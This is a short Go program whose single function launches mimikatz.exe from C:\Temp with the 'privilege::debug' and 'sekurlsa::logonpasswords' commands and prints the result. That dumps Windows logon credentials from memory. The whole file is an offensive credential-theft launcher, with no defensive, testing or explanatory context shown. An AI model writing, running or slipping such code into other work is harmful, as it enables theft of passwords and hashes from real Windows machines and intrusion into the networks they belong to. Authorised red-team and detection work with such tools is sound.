package main

import (
	"fmt"
	"os/exec"
)

func RUNMIMIKATZ() {
	out, err := exec.Command("C:\\Temp\\mimikatz.exe", "privilege::debug", "sekurlsa::logonpasswords", "exit").Output()
	if err != nil {
		fmt.Printf("%s\n", err)
	}
	fmt.Println("MIMIKATZ EXECUTED.")
	fmt.Println(string(out))
}

func main() {
	RUNMIMIKATZ()
}
